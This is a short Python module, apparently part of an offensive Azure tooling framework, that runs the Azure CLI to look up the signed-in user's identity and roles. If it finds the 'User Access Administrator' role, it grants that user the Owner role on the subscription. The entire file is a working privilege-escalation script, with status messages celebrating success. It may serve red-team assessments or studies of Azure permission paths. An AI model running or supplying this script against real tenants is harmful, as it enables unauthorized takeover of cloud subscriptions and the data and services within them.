import subprocess
import json
import pprint

def start(args):
		
	help_str = "usage:\n\texec priv_esc---> will attempt to escalate privileges"

	if(len(args)>0):
		if(args[0][0] == "?"):
			print(help_str)
			return
	
	print("[+] getting the UPN of the current user [+]")

	upn_resp = subprocess.run(['az', 'ad', 'signed-in-user', 'show','--query', '{upn:userPrincipalName}'], stdout=subprocess.PIPE)
	upn_json_obj = json.loads(upn_resp.stdout.decode('utf-8'))
	upn = upn_json_obj['upn']

	print("[+] getting the roles of the current user [+]")
	role_resp = subprocess.run(['az', 'role', 'assignment', 'list', '--assignee', upn, '--query', '[].{roleName:roleDefinitionName}'], stdout=subprocess.PIPE)
	role_json_obj = json.loads(role_resp.stdout.decode('utf-8'))

	role_list = []
	
	for role in role_json_obj:
		role_list.append(role["roleName"])

	if(len(role_list) == 0):
		print("[-] no roles found [-]")
		return

	
	if "User Access Administrator" in role_list:
		print("[+] discovered priv esc path through user access admin role! [+]")
		print("[+] initiating privilege escalation [+]")
		
		priv_esc = subprocess.run(['az', 'role', 'assignment', 'create', '--assignee', upn, '--role', 'Owner'], stdout=subprocess.PIPE)
		if(priv_esc.returncode == 0):
			print("[+] priv esc worked!", upn, "is now an 'Owner' of the subscription [+]")
		else:
			print("[-] something went wrong and the api call failed. double check this isnt a false positive [-]")
		

	else:
		print("[-] did not discover priv esc path [-]")	



	
	